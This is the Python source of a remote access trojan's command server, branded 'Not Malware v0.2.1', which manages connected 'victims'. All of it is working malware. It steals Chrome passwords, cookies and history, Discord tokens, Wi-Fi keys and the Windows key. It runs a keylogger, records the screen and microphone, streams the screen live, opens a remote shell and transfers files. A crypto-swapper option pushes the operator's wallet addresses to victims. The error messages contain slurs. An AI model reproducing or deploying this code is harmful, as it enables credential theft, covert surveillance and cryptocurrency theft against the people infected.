import argparse, socket, httpx, os, socket, time, asyncio
from threading import Thread
from plyer import notification
from vidstream import StreamingServer


parser = argparse.ArgumentParser(description="NOT, python reverse shell using sockets.")
parser.add_argument( "-p", "--port", default=421, help="Port of the Server.", type=int)
parser.add_argument("-d", "--discord", help="Discord webhook for new connections.", type=str)    
parser.add_argument("-c", "--cryptoswapper",action="store_true" ,help="Enables the crypto swapper.")   
parser.add_argument("-a", "--allinfo",action="store_true" ,help="Runs the get allinfo command on startup.")     

''' Colors '''
MAIN = '\033[38;5;50m'
PLOAD = '\033[38;5;119m'
GREEN = '\033[38;5;47m'
BLUE = '\033[0;38;5;12m'
ORANGE = '\033[0;38;5;214m'
RED = '\033[1;31m'
END = '\033[0m'
BOLD = '\033[1m'

''' MSG Prefixes '''
INFO = f'{MAIN}Info{END}'
EXIT = f'{MAIN}Exited{END}'
WARN = f'{ORANGE}Warning{END}'
IMPORTANT = WARN = f'{ORANGE}Important{END}'
FAILED = f'{RED}Fail{END}'
DEBUG = f'{ORANGE}Debug{END}'
INPUT = f'{BLUE}Input{END}'
REMOTE = WARN = f'{ORANGE}Remote{END}'
CLEAR = f'{PLOAD}CLEARED{END}'



class Functions(object):
    @staticmethod
    def get_allinfo(command, client_socket, hostname):
        client_socket.send(command.encode())
        filename = f'allinfo.zip'
        client_socket.send(filename.encode())
        remaining = int.from_bytes(client_socket.recv(4),'big')
        f = open(f"./files/{hostname}.zip","wb")
        while remaining:
            data = client_socket.recv(min(remaining,4096))
            remaining -= len(data)
            f.write(data)
        f.close()
    @staticmethod
    def get_chromecookies(self):
        self.client_socket.send(self.command.encode())
        filename = 'cookies.txt'
        self.client_socket.send(filename.encode())
        remaining = int.from_bytes(self.client_socket.recv(4),'big')
        f = open(f"./chromedata/{filename}","wb")
        while remaining:
            data = self.client_socket.recv(min(remaining,4096))
            remaining -= len(data)
            f.write(data)
        f.close()
    @staticmethod
    def get_searchhistory(self):
        self.client_socket.send(self.command.encode())
        filename = 'history.csv'
        self.client_socket.send(filename.encode())
        remaining = int.from_bytes(self.client_socket.recv(4),'big')
        f = open(f"./chromedata/{filename}","wb")
        while remaining:
            data = self.client_socket.recv(min(remaining,4096))
            remaining -= len(data)
            f.write(data)
        f.close()
    @staticmethod
    def get_chromepasswords(self):
        self.client_socket.send(self.command.encode())
        filename = 'chrome_passwords.txt'
        self.client_socket.send(filename.encode())
        remaining = int.from_bytes(self.client_socket.recv(4),'big')
        f = open(f"./chromedata/{filename}","wb")
        while remaining:
            data = self.client_socket.recv(min(remaining,4096))
            remaining -= len(data)
            f.write(data)
        f.close()
    @staticmethod
    def crypto_swapper_loop(client_socket, buffer_size):
        CRYPTO_HOST = "0.0.0.0"
        CRYPTO_PORT = 427
        c = socket.socket()
        c.bind((CRYPTO_HOST, CRYPTO_PORT))
        c.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        c.listen(5)
        client_socket.send(("connect").encode())
        crypto_socket, crypto_address = c.accept()
        while True:
            type = crypto_socket.recv(buffer_size).decode()
            notification.notify(
                title = 'Crypto Swapper',
                message = f"found address type: {type}",
                app_icon = None,
                timeout = 1,
            )
    @staticmethod
    def exit_tm(self):
        global runningzz
        exit_choice = input(f"\n[{IMPORTANT}] Are you sure you want to exit (y/n)? ")
        while(exit_choice != "y" and exit_choice != "n"):
            print(f"[{FAILED}] (y/n) \n")
            time.sleep(0.4)
            exit_choice = input(f"[{IMPORTANT}] Are you sure you want to exit (y/n)? ")
        if exit_choice == "y":
            print(f"\n[{EXIT}]\n")
            runningzz = False
        if exit_choice == "n":
            pass
    @staticmethod
    def exit_main(self):
        exit_choice = input(f"\n[{IMPORTANT}] Are you sure you want to exit (y/n)? {END}")
        while(exit_choice != "y" and exit_choice != "n"):
            print(f"[{FAILED}] (y/n) \n{END}")
            time.sleep(0.4)
            exit_choice = input(f"[{IMPORTANT}] Are you sure you want to exit (y/n)? {END} ")
        if exit_choice == "y":
            commands = "exit"
            for victims in list(self.list_of_victims.values()):
                victims[0].send(commands.encode())
            self.s.close()
            print(f"\n[{EXIT}] {END}\n")
            os._exit(0)
        if exit_choice == "n":
            pass
    @staticmethod
    def record_screen(self):
        filename = input(f"[{IMPORTANT}] filename of recording: {END}")
        filename = filename + ".mp4"
        self.client_socket.send(self.command.encode())
        time_stop = input(f"[{IMPORTANT}] how long do you want to record for: {END}")
        self.client_socket.send(time_stop.encode())
        print(f"[{IMPORTANT}] recording ......{END}\n")
        def record_screen_loop():
            RECORD_HOST = "0.0.0.0"
            RECORD_PORT = 426
            r = socket.socket()
            r.bind((RECORD_HOST, RECORD_PORT))
            r.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            r.listen(5)
            self.client_socket.send(("connect").encode())
            screen_socket, screen_address = r.accept()
            remaining = int.from_bytes(screen_socket.recv(4),'big')
            f = open(f"./recordings/{filename}","wb")
            while remaining:
                data = screen_socket.recv(min(remaining,4096))
                remaining -= len(data)
                f.write(data)
            f.close()
        record_mic_loopz = Thread(target=record_screen_loop)
        record_mic_loopz.daemon = True
        record_mic_loopz.start()
    @staticmethod
    def screenshot(self):
        filename = input(f"[{IMPORTANT}] filename of screenshot: {END}")
        filename = filename + ".png"
        print(f"[{IMPORTANT}] taking screenshot ......{END}\n")
        self.client_socket.send(self.command.encode())
        remaining = int.from_bytes(self.client_socket.recv(4),'big')
        f = open(f"./screenshots/{filename}","wb")
        while remaining:
            data = self.client_socket.recv(min(remaining,4096))
            remaining -= len(data)
            f.write(data)
        f.close()
        print(f"[{INFO}] screenshot recved successfully{END}")
    @staticmethod
    def start_keylogger(self):
        global runningz
        runningz = True
        def keylogger_loop():
            global runningz
            print(f"[{IMPORTANT}] logging keys .....{END}")
            LOGGER_HOST = "0.0.0.0"
            LOGGER_PORT = 422
            l = socket.socket()
            l.bind((LOGGER_HOST, LOGGER_PORT))
            l.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            l.listen(5)
            self.client_socket.send(self.command.encode())
            logger_socket, logger_address = l.accept()
            def keylogger():
                while runningz:
                    msg = logger_socket.recv(self.BUFFER_SIZE).decode()
                    addr = logger_socket.getpeername()[0]
                    with open(f"./logs/{addr}-log.txt", "a+") as file1:
                        file1.write(f"{msg}")
            loggerz = Thread(target=keylogger)
            loggerz.daemon = True
            loggerz.start()
        keylogger_loopz = Thread(target=keylogger_loop)
        keylogger_loopz.daemon = True
        keylogger_loopz.start()
    @staticmethod
    def stop_keylogger(self):
        self.client_socket.send(self.command.encode())
        print(f"[{IMPORTANT}] logging stopped{END}")
        runningz = False
    @staticmethod
    def send_command(self):
        self.client_socket.send(self.command.encode())
        cwd = self.client_socket.recv(self.BUFFER_SIZE).decode()
        send_command = input(f"\n[{REMOTE}] {cwd} $> {END}")
        if not send_command.strip():
            pass
        self.client_socket.send(send_command.encode())
        output = self.client_socket.recv(self.BUFFER_SIZE).decode()
        results, cwd = output.split(self.SEPARATOR)
        print(results)
    @staticmethod
    def send_commands(self):
        self.client_socket.send(self.command.encode())
        running = True
        cwd = self.client_socket.recv(self.BUFFER_SIZE).decode()
        while running:
            send_command = input(f"\n[{REMOTE}] {cwd} $> {END}")
            if not send_command.strip():
                continue
            if send_command == "exit":
                self.client_socket.send(send_command.encode())
                break
            self.client_socket.send(send_command.encode())
            output = self.client_socket.recv(self.BUFFER_SIZE).decode()
            results, cwd = output.split(self.SEPARATOR)
            print(results)
    @staticmethod
    def record_mic(self):
        filename = input(f"[{IMPORTANT}] filename of mic audio: {END}")
        filename = filename + ".wav"
        self.client_socket.send(self.command.encode())
        record_time = input(f"[{IMPORTANT}] how long do you want to record for: {END}")
        self.client_socket.send(record_time.encode())
        print(f"[{IMPORTANT}] recording mic ......{END}\n")
        def record_mic_loop():
            MIC_HOST = "0.0.0.0"
            MIC_PORT = 425
            m = socket.socket()
            m.bind((MIC_HOST, MIC_PORT))
            m.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            m.listen(5)
            self.client_socket.send(("connect").encode())
            mic_socket, mic_address = m.accept()
            remaining = int.from_bytes(mic_socket.recv(4),'big')
            f = open(f"./microphone/{filename}","wb")
            while remaining:
                data = mic_socket.recv(min(remaining,4096))
                remaining -= len(data)
                f.write(data)
            f.close()
            m.close()
        record_mic_loopz = Thread(target=record_mic_loop)
        record_mic_loopz.daemon = True
        record_mic_loopz.start()
    @staticmethod
    def get_wifi(self):
        print(f"[{IMPORTANT}] getting wifi profiles{END}\n")
        self.client_socket.send("get wifi".encode())
        print(self.client_socket.recv(self.BUFFER_SIZE).decode())
    @staticmethod
    def clear_tm():
        def clear():
            os.system('cls' if os.name=='nt' else 'clear')
            return("   ")
        clear()
        print(f"[{CLEAR}] ")
    @staticmethod
    def get_file(self):
        self.client_socket.send(self.command.encode())
        filename = input(f"[{IMPORTANT}] Please enter the filename: ")
        self.client_socket.send(filename.encode())
        remaining = int.from_bytes(self.client_socket.recv(4),'big')
        f = open(f"./files/{filename}","wb")
        while remaining:
            data = self.client_socket.recv(min(remaining,4096))
            remaining -= len(data)
            f.write(data)
        f.close()
    @staticmethod
    def send_file(self):
        self.client_socket.send(self.command.encode())
        filename = input(f"[{IMPORTANT}] please enter the filename: ")
        self.client_socket.send(filename.encode())
        try:
            with open(f"./files/{filename}", "rb") as f:
                data = f.read()
                dataLen = len(data)
                self.client_socket.send(dataLen.to_bytes(4,'big'))
                self.client_socket.send(data)
            f.close()
        except FileNotFoundError:
            print(f"\n[{FAILED}] File not found{END}")
    @staticmethod
    def start_live(self):
        self.receiver = StreamingServer(self.client_address[0], self.receiver_port)
        self.client_socket.send('get live'.encode())
        p = Thread(target=self.receiver.start_server)
        p.start()
    @staticmethod
    def stop_live(self):
        self.client_socket.send('stop live'.encode())
        self.receiver.stop_server()
        self.receiver_port = 424
    @staticmethod
    def sysinfo(self):
        self.client_socket.send('get sysinfo'.encode())
        output = self.client_socket.recv(self.BUFFER_SIZE).decode().split(self.SEPARATOR)
        HWID, wkey, winver = output
        print(f"[{INFO}] HWID: {HWID}")
        print(f"[{INFO}] Windows Key: {wkey}")
        print(f"[{INFO}] Windows Version: {winver}")
    @staticmethod
    def get_token(self):
        self.client_socket.send('get token'.encode())
        token = self.client_socket.recv(self.BUFFER_SIZE).decode()
        print(f"[{INFO}] Token: {token}")
    @staticmethod
    def main_while(self):
        global runningzz
        runningzz = True
        while runningzz:
            self.command = input(f"\n[{f'{BLUE}{self.hostname}{END}'}] > ")
            if self.command == "exit" or self.command == "quit" or self.command == "q":
                Functions.exit_tm(self)     
            if self.command.lower() == "get token":
                Functions.get_token(self)
            if self.command.lower() == "get sysinfo":
                Functions.sysinfo(self)
            if self.command.lower() == "get netinfo":
                Functions.netinfo(self)
            if self.command.lower() == "record screen":
                Functions.record_screen(self)
            if self.command.lower() == "take screenshot":
                Functions.screenshot(self)
            if self.command.lower() == "start keylogger":
                Functions.start_keylogger(self)
            if self.command.lower() == "stop keylogger":
                Functions.stop_keylogger(self)
            if self.command.lower() == "send command":
                Functions.send_command(self)
            if self.command.lower() == "send commands":
                Functions.send_commands(self)
            if self.command.lower() == "record mic":
                Functions.record_mic(self)
            if self.command.lower() == "get wifi":
                Functions.get_wifi(self)
            if self.command.lower() == "clear":
                Functions.clear_tm()
            if self.command.lower() == "get file":
                Functions.get_file(self)
            if self.command.lower() == "send file":
                Functions.send_file(self)
            if self.command.lower() == "get live":
                Functions.start_live(self)
            if self.command.lower() == "stop live":
                Functions.stop_live(self)
            if self.command.lower() == "get chromepasswords":
                Functions.get_chromepasswords(self)
            if self.command.lower() == "get searchhistory":
                Functions.get_searchhistory(self)
            if self.command.lower() == "get chromecookies":
                Functions.get_chromecookies(self)
            if self.command.lower() == "get chromedata":
                self.command = "get chromepasswords"
                Functions.get_chromepasswords(self)
                self.command = "get searchhistory"
                Functions.get_searchhistory(self)
                self.command = "get chromecookies"
                Functions.get_chromecookies(self)
            if self.command.lower() == "get allinfo":
                Functions.get_allinfo(self.command, self.client_socket, self.hostname)
            if self.command.lower() == "help":
                Functions.help()
            if self.command.lower() not in self.command_list:
                print(f"[{FAILED}] that aint a command cunt try again retard!! {END}\n")
    @staticmethod
    def new_connection(list_of_victims, SEPARATOR, s, cryptoswapper, BUFFER_SIZE, allinfo):
        while True:
            client_socket, client_address = s.accept()
            if cryptoswapper:
                client_socket.send(f"{btc_address}{SEPARATOR}{eth_address}{SEPARATOR}{ltc_address}".encode())
                Thread(target=Functions.crypto_swapper_loop, args=(client_socket, BUFFER_SIZE)).start()
            else:
                client_socket.send(("no").encode())
            hostname = client_socket.recv(BUFFER_SIZE).decode()
            if allinfo:
                command = 'get allinfo'
                Functions.get_allinfo(command, client_socket, hostname)
            list_of_victims[hostname] = client_socket, client_address
    @staticmethod
    def netinfo(self):
        self.client_socket.send('get netinfo'.encode())
        output = self.client_socket.recv(self.BUFFER_SIZE).decode().split(self.SEPARATOR)
        ip, city, country, region, org, loc, googlemap = output
        print(f"[{INFO}] IP: {ip}")
        print(f"[{INFO}] City: {city}")
        print(f"[{INFO}] Country: {country}")
        print(f"[{INFO}] Region: {region}")
        print(f"[{INFO}] Org: {org}")
        print(f"[{INFO}] Location: {loc}")
        print(f"[{INFO}] Google Map: {googlemap}")
    @staticmethod
    def sessions(self):
        print(f"""
\n{GREEN} 
Hostname                 IP
--------------------------------------------
{END}""")
        for i in list(self.list_of_victims.keys()):
            print(f"""{GREEN}{i}          {self.list_of_victims[i][1][0]}     {END}""")
        print("\n")
    @staticmethod
    def help():
        print(
        f'''{MAIN}
\r  Command                    Description
\r  -------                    -----------
\r  help                       Print this message.
\r  get wifi                   Gets SSIDs and security keys.
\r  get token                  Gets discord token.
\r  get sysinfo                Gets system information.
\r  get netinfo                Gets network information.
\r  get live                   Live Recording of victim's screen.
\r  stop live                  Stops Live Recording of victim's screen.
\r  record mic                 Records mic for a certain amount of time.
\r  record screen              Records screen for a certain amount of time.
\r  take screenshot            Takes a screenshot.
\r  start keylogger            Starts keylogger.
\r  stop keylogger             Stops keylogger.
\r  send command               Sends a single command.
\r  send commands              Sends multiple commands.
\r  send file                  Sends a file from the files directory in the attacker directory.
\r  get file                   Gets a file from the victim's CWD and puts it into the files directory.
\r  get chromepasswords        Gets chrome passwords and puts the file in the chromedata directory.
\r  get searchhistory          Gets search history from all browsers on victim's PC and puts the file in the chromedata directory.
\r  get chromecookies          Gets chrome cookies and puts the file in the chromedata directory.
\r  get chromedata             Gets all files from the 3 above commands and puts the file in the chromedata directory.
\r  get allinfo                Gets all infomation possible from the victim's PC and zips it in the files directory.
\r  clear                      Clear screen.
\r  exit/quit/q                Close session and exit.
        {END}''')
    @staticmethod
    def help_main():
        print(
        f'''{MAIN}
\r  Command                    Description
\r  -------                    -----------
\r  help                       Print this message.
\r  sessions                   Prints all connected victim's.
\r  connect                    Connects to the victim's PC based on the sessions hostnames.
\r  clear                      Clear screen.
\r  exit/quit/q                Close session and exit.
        {END}''')


            
    
class Main(Functions):
    def __init__(self):
        print(f"""{PLOAD}
                       __                                    __                                             
                      /  |                                  /  |                                            
 _______    ______   _$$ |_          _____  ____    ______  $$ | __   __   __   ______    ______    ______  
/       \  /      \ / $$   |        /     \/    \  /      \ $$ |/  | /  | /  | /      \  /      \  /      \ 
$$$$$$$  |/$$$$$$  |$$$$$$/         $$$$$$ $$$$  | $$$$$$  |$$ |$$ | $$ | $$ | $$$$$$  |/$$$$$$  |/$$$$$$  |
$$ |  $$ |$$ |  $$ |  $$ | __       $$ | $$ | $$ | /    $$ |$$ |$$ | $$ | $$ | /    $$ |$$ |  $$/ $$    $$ |
$$ |  $$ |$$ \__$$ |  $$ |/  |      $$ | $$ | $$ |/$$$$$$$ |$$ |$$ \_$$ \_$$ |/$$$$$$$ |$$ |      $$$$$$$$/ 
$$ |  $$ |$$    $$/   $$  $$/       $$ | $$ | $$ |$$    $$ |$$ |$$   $$   $$/ $$    $$ |$$ |      $$       |
$$/   $$/  $$$$$$/     $$$$/        $$/  $$/  $$/  $$$$$$$/ $$/  $$$$$/$$$$/   $$$$$$$/ $$/        $$$$$$$/ 
                                                                    {END}Not Malware v0.2.1 | fluffydolphin                 
""")
        self.hostname = socket.gethostname()
        self.IPAddr = socket.gethostbyname(self.hostname)
        self.args = parser.parse_args()
        self.SERVER_HOST = "0.0.0.0"
        self.SERVER_PORT = self.args.port
        self.BUFFER_SIZE = 1024 * 128
        self.SEPARATOR = "<sep>"
        self.receiver_port = 424
        self.key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='
        self.command_list = ["get allinfo","get chromedata","get chromecookies", "get searchhistory", "get chromepasswords", "get token", "get netinfo", "get sysinfo", "get live","stop live","get file", "send file", "send commands", "help", "get wifi", "clear", "scan ports", "exit", "scan local ports", "record screen", "take screenshot", "start keylogger", "send command", "stop keylogger", "record mic"]
        self.command_list_main = ["connect", "sessions", "help", "exit", "clear"]
        self.list_of_victims = {}
        
        
        self.s = socket.socket()
        self.s.bind((self.SERVER_HOST, self.SERVER_PORT))
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.listen(5)
        
        if self.args.cryptoswapper:
            global btc_address, eth_address, ltc_address
            btc_address = str(input(f"[{INPUT}] Please enter the bitcoin address [enter if none]: "))
            eth_address = str(input(f"[{INPUT}] Please enter the ethereum address [enter if none]: "))
            ltc_address = str(input(f"[{INPUT}] Please enter the litecoin address [enter if none]: "))
        print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt .....{END}', end = '\n\n')
                
        Thread(target=Functions.new_connection, args=(self.list_of_victims, self.SEPARATOR, self.s, self.args.cryptoswapper, self.BUFFER_SIZE, self.args.allinfo)).start()
                
        while True:
            try:
                self.command = input(f"\n[{f'{BLUE}console{END}'}] > ")
                if self.command == "exit" or self.command == "quit" or self.command == "q":
                    Functions.exit_main(self)     
                if "connect" in self.command:
                    self.hostname = self.command.split(" ")[1]
                    if self.list_of_victims.setdefault(self.hostname) != None:
                        self.client_socket = self.list_of_victims.setdefault(self.hostname)[0]
                        self.client_address = self.list_of_victims.setdefault(self.hostname)[1]
                        Functions.main_while(self)
                if self.command.lower() == "sessions":
                    Functions.sessions(self)
                if self.command.lower() == "help":
                    Functions.help_main()
                if self.command.lower() == "clear":
                    Functions.clear_tm()
                if self.command.lower() not in self.command_list_main:
                    print(f"[{FAILED}] that aint a command cunt try again retard!! {END}\n")
            except KeyboardInterrupt:
                 Functions.exit_main(self)


if __name__ == "__main__" and os.name == "nt":
    try:
        httpx.get('https://google.com')
    except (httpx.NetworkError, httpx.TimeoutException):
        os._exit(0)
    asyncio.run(Main().init())